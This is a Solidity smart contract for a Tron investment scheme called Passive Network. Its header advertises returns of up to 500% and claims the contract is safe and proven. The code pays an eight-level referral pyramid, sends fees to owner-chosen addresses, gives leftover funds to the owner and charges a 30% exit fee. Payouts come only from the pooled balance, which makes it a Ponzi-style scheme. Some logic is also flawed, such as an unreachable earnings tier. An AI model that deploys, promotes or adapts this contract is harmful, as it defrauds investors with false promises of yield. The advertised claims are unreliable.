//SourceUnit: PassiveNetworkTron.sol

/*
* 
* 
*   _____              _           _   _      _                      _    
*  |  __ \            (_)         | \ | |    | |                    | |   
*  | |__) |_ _ ___ ___ ___   _____|  \| | ___| |___      _____  _ __| | __
*  |  ___/ _` / __/ __| \ \ / / _ \ . ` |/ _ \ __\ \ /\ / / _ \| '__| |/ /
*  | |  | (_| \__ \__ \ |\ V /  __/ |\  |  __/ |_ \ V  V / (_) | |  |   < 
*  |_|   \__,_|___/___/_| \_/ \___|_| \_|\___|\__| \_/\_/ \___/|_|  |_|\_\
*                                                                         
*                                                                         
* Earn up to 500% Return on your investment!
*
* - From the team who brought you:
* -   https://ETHMatrix.network 
* -   https://TRONMatrix.com
*
* Comes https://Passive.Network
*
* - Available for both Tron and Ethereum!
*
* - Safe, Secure & Proven!
*
*/


pragma solidity ^0.5.9;



library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

contract PassiveNetworkTron {

    using SafeMath for uint256;
    
    event Deposit(address player, address referrer, uint amount);
    event Reinvest(address player, uint amount);
    event Withdrawal(address player, uint amount);
    event ExitGame(address player, uint amount);
    
    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    
    uint private minDepositSize1 = 50000000;
    uint private minDepositSize2 = 5000000000;
    uint private minDepositSize3 = 10000000000;
    uint private minDepositSize4 = 25000000000;
    uint private minDepositSize5 = 50000000000;
    uint private minDepositSize6 = 250000000000;
    uint private minDepositSize7 = 500000000000;
    uint private interestRateDivisor = 1000000000000;
    
    
    
    uint public interestDivisor = 10000;
    
    uint public exitFee = 3000; // 30.00%
    uint public techCommission = 300; // 3.00%
    uint public markCommission = 300; // 3.00%

    
    
    uint public Aff = 2400; // 24.00%
    uint public Aff1 = 750; // 7.50%
    uint public Aff1A = 800; // 8.00%
    uint public Aff1B = 1000; // 10.00%
    uint public Aff2 = 500; // 5%
    uint public Aff3 = 300; // 3%
    uint public Aff4 = 200; // 2%
    uint public Aff5_8 = 100; // 1%
    

    uint public MaxEarning1 = 20000; // 200.00%
    uint public MaxEarning2 = 25000; // 250.00%
    uint public MaxEarning3 = 30000; // 300.00%
    uint public MaxEarning4 = 35000; // 350.00%
    uint public MaxEarning5 = 40000; // 400.00%
    uint public MaxEarning6 = 45000; // 450.00%
    uint public MaxEarning7 = 50000; // 500.00%


    uint private interestPerSecond3 = 347223; //3%
    uint private interestPerSecond3_5 = 405093; //3.5%
    uint private interestPerSecond4 = 462963; //4%
    uint private interestPerSecond4_5 = 520833; //4.5%
    uint private interestPerSecond5 = 578704; //5%
    uint private interestPerSecond5_5 = 636574; //5%
    uint private interestPerSecond6 = 694444; //6%
    uint private interestPerSecond6_5 = 752315; //6.5%
    uint private interestPerSecond7 = 810185; //7%
    uint private interestPerSecond7_5 = 868056; //7.5%
    uint private interestPerSecond8 = 925926; //8%
    uint private interestPerSecond8_5 = 983796; //8.5%
    
    
    bool private isOpen = false;
    
    address private feed1;
    address private feed2;
    address owner;
    
    
    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
    }
    
    mapping(address => uint256) public lastWithdrawal;
    mapping(address => bool) public playerExit;
    mapping(address => Player) public players;

    constructor(address _feed1, address _feed2) public {
      owner = msg.sender;
      feed1 = _feed1;
      feed2 = _feed2;
    }


    function register(address _addr, address _affAddr) private{
        require(playerExit[_addr] == false, "Player has exited!");
        
        Player storage player = players[_addr];
        
        player.affFrom = _affAddr;
        
        address _affAddr1 = _affAddr;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;

        if(_affAddr1 != address(0))
            players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);

        if(_affAddr2 != address(0))
            players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
            
        if(_affAddr3 != address(0))
            players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);

        if(_affAddr4 != address(0))
            players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);

        if(_affAddr5 != address(0))
            players[_affAddr5].aff5sum = players[_affAddr5].aff5sum.add(1);

        if(_affAddr6 != address(0))
            players[_affAddr6].aff6sum = players[_affAddr6].aff6sum.add(1);

        if(_affAddr7 != address(0))
            players[_affAddr7].aff7sum = players[_affAddr7].aff7sum.add(1);

        if(_affAddr8 != address(0))
            players[_affAddr8].aff8sum = players[_affAddr8].aff8sum.add(1);
      
        lastWithdrawal[_addr] = now;
        
        
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {

        require(isOpen == true, "Game not yet open!");
        require(msg.value >= minDepositSize1);


        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        } else {
            if(playerExit[msg.sender] == true) {
                // reset as a fresh/new player if they wish to rejoin
                player.trxDeposit = 0;
                player.time = now;
                player.interestProfit = 0;
                player.payoutSum = 0;
                lastWithdrawal[msg.sender] = now;
                playerExit[msg.sender] = false;
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        uint feedEarn1 = depositAmount.mul(techCommission).div(interestDivisor);
        uint feedEarn2 = depositAmount.mul(markCommission).div(interestDivisor);
        address(uint160(feed1)).transfer(feedEarn1);
        address(uint160(feed2)).transfer(feedEarn2);

        emit Deposit(msg.sender, _affAddr, msg.value);
    }

    function withdraw() public {
        require(playerExit[msg.sender] == false, "Player has exited!");
        
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
        

    }

    function reinvest() public {
        require(playerExit[msg.sender] == false, "Player has exited!");
        collect(msg.sender);
        Player storage player = players[msg.sender];
        uint256 depositAmount = player.interestProfit;
        require(address(this).balance >= depositAmount);
        player.interestProfit = 0;
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        totalInvested = totalInvested.add(depositAmount);

        distributeRef(depositAmount, player.affFrom);

        uint feedEarn1 = depositAmount.mul(techCommission).div(interestDivisor);
        uint feedEarn2 = depositAmount.mul(markCommission).div(interestDivisor);
        address(uint160(feed1)).transfer(feedEarn1);
        address(uint160(feed2)).transfer(feedEarn2);

        emit Reinvest(msg.sender, depositAmount);
        
    }
    

    function getExitAmount(address _addr) public view returns (uint) {
        require(playerExit[_addr] == false, "Player has exited!");
        require(players[_addr].trxDeposit > players[_addr].payoutSum, "You have already ROI, you cannot exit the game now!");
        uint _currentInterestProfit = getProfit(_addr);
        return players[_addr].trxDeposit.sub(players[_addr].trxDeposit.mul(exitFee).div(interestDivisor)).sub(_currentInterestProfit).sub(players[_addr].payoutSum);
    }
    
    function exit() public {
        require(playerExit[msg.sender] == false, "Player has exited!");
        collect(msg.sender);
        Player storage player = players[msg.sender];
        if(player.interestProfit > 0)
            transferPayout(msg.sender, players[msg.sender].interestProfit);
            
        require(player.trxDeposit > player.payoutSum, "You have already ROI, you cannot exit the game now!");
        
        uint roiAmount = player.trxDeposit.sub(player.trxDeposit.mul(exitFee).div(interestDivisor)).sub(player.payoutSum);

        playerExit[msg.sender] = true;        
        address(uint160(msg.sender)).transfer(roiAmount);

        emit ExitGame(msg.sender, roiAmount);
    }


    function collect(address _addr) internal  {
        Player storage player = players[_addr];

        uint collectProfit = playerProfit(_addr);
        uint secPassed = now.sub(player.time);

        
        if (collectProfit > 0) {
         
            if (collectProfit > address(this).balance){ collectProfit = 0;}
         
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                lastWithdrawal[msg.sender] = now;
                msg.sender.transfer(payout);
                emit Withdrawal(msg.sender, payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(Aff)).div(interestDivisor);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        uint256 _affRewards = 0;
        
             if (_affAddr1 != address(0)) {
             
             if (players[_affAddr1].aff1sum <= 10){_affRewards = (_trx.mul(Aff1A)).div(interestDivisor);} 
             if (players[_affAddr1].aff1sum > 10 && players[_affAddr1].aff1sum <= 50){_affRewards = (_trx.mul(Aff1B)).div(interestDivisor);} 
             if (players[_affAddr1].aff1sum > 50){_affRewards = (_trx.mul(Aff1)).div(interestDivisor);}
            
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            address(uint160(_affAddr1)).transfer(_affRewards);
           
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(Aff2)).div(interestDivisor);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            address(uint160(_affAddr2)).transfer(_affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(Aff3)).div(interestDivisor);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            address(uint160(_affAddr3)).transfer(_affRewards);
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(Aff4)).div(interestDivisor);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            address(uint160(_affAddr4)).transfer(_affRewards);
        }

        if (_affAddr5 != address(0)) {
            _affRewards = (_trx.mul(Aff5_8)).div(interestDivisor);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
            address(uint160(_affAddr5)).transfer(_affRewards);
        }

        if (_affAddr6 != address(0)) {
            _affRewards = (_trx.mul(Aff5_8)).div(interestDivisor);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);
            address(uint160(_affAddr6)).transfer(_affRewards);
        }

        if (_affAddr7 != address(0)) {
            _affRewards = (_trx.mul(Aff5_8)).div(interestDivisor);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);
            address(uint160(_affAddr7)).transfer(_affRewards);
        }

        if (_affAddr8 != address(0)) {
            _affRewards = (_trx.mul(Aff5_8)).div(interestDivisor);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr8].affRewards = _affRewards.add(players[_affAddr8].affRewards);
            address(uint160(_affAddr8)).transfer(_affRewards);
        }

        if(_allaff > 0 ){
            address(uint160(owner)).transfer(_allaff);
        }
    }


    function playerProfit(address _addr) internal view returns (uint) {
        uint interestRate;
        uint maxEarning;
        uint collectProfit;
        uint secPassed = now.sub(players[_addr].time);
        uint _lastWithdrawal = now - lastWithdrawal[_addr];
        uint _trxDeposit = players[_addr].trxDeposit;
        
        if (secPassed > 0 && players[_addr].time > 0) {
        
            // band 1 & 2 - 3% base rate
            if (_trxDeposit <= minDepositSize3) {
                if(_lastWithdrawal >= 60 days){
                    interestRate = interestPerSecond5;    
                } else {
                    if(_lastWithdrawal >= 30 days) {
                        interestRate = interestPerSecond4;   
                    } else {
                        if(_lastWithdrawal >= 14 days) 
                            interestRate = interestPerSecond3_5;
                        else
                            interestRate = interestPerSecond3;
                    }
                }
             
                if(_trxDeposit <= minDepositSize2)
                    maxEarning = MaxEarning1;
                else
                    maxEarning = MaxEarning2;
            }
        
            // band 3 & 4 - 4% base rate
             if (_trxDeposit > minDepositSize3 && _trxDeposit <= minDepositSize5) {
                if(_lastWithdrawal >= 60 days){
                    interestRate = interestPerSecond6;    
                } else {
                    if(_lastWithdrawal >= 30 days) {
                        interestRate = interestPerSecond5;   
                    } else {
                        if(_lastWithdrawal >= 14 days) 
                            interestRate = interestPerSecond4_5;
                        else
                            interestRate = interestPerSecond4;
                    }
                }
                
                if(_trxDeposit <= minDepositSize4)
                    maxEarning = MaxEarning3;
                else
                    maxEarning = MaxEarning4;
            }
            
            
            // band 5 & 6 - 5% base rate
             if (_trxDeposit > minDepositSize5 && _trxDeposit <= minDepositSize7) {
                if(_lastWithdrawal >= 60 days){
                    interestRate = interestPerSecond7;    
                } else {
                    if(_lastWithdrawal >= 30 days) {
                        interestRate = interestPerSecond6;   
                    } else {
                        if(_lastWithdrawal >= 14 days) 
                            interestRate = interestPerSecond5_5;
                        else
                            interestRate = interestPerSecond5;
                    }
                }
                
                if(_trxDeposit <= minDepositSize5)
                    maxEarning = MaxEarning5;
                else
                    maxEarning = MaxEarning6;
            }
            
            if(_trxDeposit > minDepositSize7) {
                if(_lastWithdrawal >= 60 days){
                    interestRate = interestPerSecond7;    
                } else {
                    
                    if(_lastWithdrawal >= 30 days) {
                        interestRate = interestPerSecond6;   
                    } else {
                        if(_lastWithdrawal >= 14 days) 
                            interestRate = interestPerSecond5_5;
                        else
                            interestRate = interestPerSecond5;
                    }
                }
                maxEarning = MaxEarning7;
            }


        
            uint collectProfitGross = (_trxDeposit.mul(secPassed.mul(interestRate))).div(interestRateDivisor);
         
            uint256 maxprofit = (_trxDeposit.mul(maxEarning).div(interestDivisor));
            uint256 collectProfitNet = collectProfitGross.add(players[_addr].interestProfit);
            uint256 amountpaid = (players[_addr].payoutSum.add(players[_addr].affRewards));
            uint256 sum = amountpaid.add(collectProfitNet);
         
         
            if (sum <= maxprofit) {
                collectProfit = collectProfitGross; 
            } else {
                uint256 collectProfit_net = maxprofit.sub(amountpaid); 
             
                if (collectProfit_net > 0) {
                    collectProfit = collectProfit_net; 
                } else {
                    collectProfit = 0; 
                }
            }
         
            if (collectProfit > address(this).balance){ collectProfit = 0;}
         
            return collectProfit;

        }   else {
            return 0;
        }
    }


    function getInterestBandInfo(address _addr) public view returns (uint interestRate, uint maxEarning) {
        uint secPassed = now.sub(players[_addr].time);
        uint _lastWithdrawal = now - lastWithdrawal[_addr];
        uint _trxDeposit = players[_addr].trxDeposit;
        
        if (secPassed > 0 && players[_addr].time > 0) {
        
            // band 1 & 2 - 3% base rate
            if (_trxDeposit <= minDepositSize3) {
                if(_lastWithdrawal >= 60 days){
                    interestRate = interestPerSecond5;    
                } else {
                    if(_lastWithdrawal >= 30 days) {
                        interestRate = interestPerSecond4;   
                    } else {
                        if(_lastWithdrawal >= 14 days) 
                            interestRate = interestPerSecond3_5;
                        else
                            interestRate = interestPerSecond3;
                    }
                }
             
                if(_trxDeposit <= minDepositSize2)
                    maxEarning = MaxEarning1;
                else
                    maxEarning = MaxEarning2;
            }
        
            // band 3 & 4 - 4% base rate
             if (_trxDeposit > minDepositSize3 && _trxDeposit <= minDepositSize5) {
                if(_lastWithdrawal >= 60 days){
                    interestRate = interestPerSecond6;    
                } else {
                    if(_lastWithdrawal >= 30 days) {
                        interestRate = interestPerSecond5;   
                    } else {
                        if(_lastWithdrawal >= 14 days) 
                            interestRate = interestPerSecond4_5;
                        else
                            interestRate = interestPerSecond4;
                    }
                }
                
                if(_trxDeposit <= minDepositSize4)
                    maxEarning = MaxEarning3;
                else
                    maxEarning = MaxEarning4;
            }
            
            
            // band 5 & 6 - 5% base rate
             if (_trxDeposit > minDepositSize5 && _trxDeposit <= minDepositSize7) {
                if(_lastWithdrawal >= 60 days){
                    interestRate = interestPerSecond7;    
                } else {
                    if(_lastWithdrawal >= 30 days) {
                        interestRate = interestPerSecond6;   
                    } else {
                        if(_lastWithdrawal >= 14 days) 
                            interestRate = interestPerSecond5_5;
                        else
                            interestRate = interestPerSecond5;
                    }
                }
                
                if(_trxDeposit <= minDepositSize5)
                    maxEarning = MaxEarning5;
                else
                    maxEarning = MaxEarning6;
            }
            
            if(_trxDeposit > minDepositSize7) {
                if(_lastWithdrawal >= 60 days){
                    interestRate = interestPerSecond7;    
                } else {
                    
                    if(_lastWithdrawal >= 30 days) {
                        interestRate = interestPerSecond6;   
                    } else {
                        if(_lastWithdrawal >= 14 days) 
                            interestRate = interestPerSecond5_5;
                        else
                            interestRate = interestPerSecond5;
                    }
                }
                maxEarning = MaxEarning7;
            }
        }    
    }

    function getProfit(address _addr) public view returns (uint) {
        if(playerExit[msg.sender] == true)
            return 0;
        
        
            
        address playerAddress= _addr;
        Player storage player = players[playerAddress];
        require(player.time > 0);
        uint collectProfit;
      
        collectProfit =  playerProfit(_addr);
  
        return collectProfit.add(player.interestProfit);
      
      }
    
    
    function updateFeed1(address _address) public  {
       require(msg.sender==owner);
       feed1 = _address;
    }
    
    function updateFeed2(address _address) public {
        require(msg.sender==owner);
        feed2 = _address;
    }
    

    

     function setOpen(bool _isOpen) public {
      require(msg.sender==owner);
      isOpen = _isOpen;
    }

    
     function setOwner(address _address) public {
      require(msg.sender==owner);
      owner = _address;
    }
    

}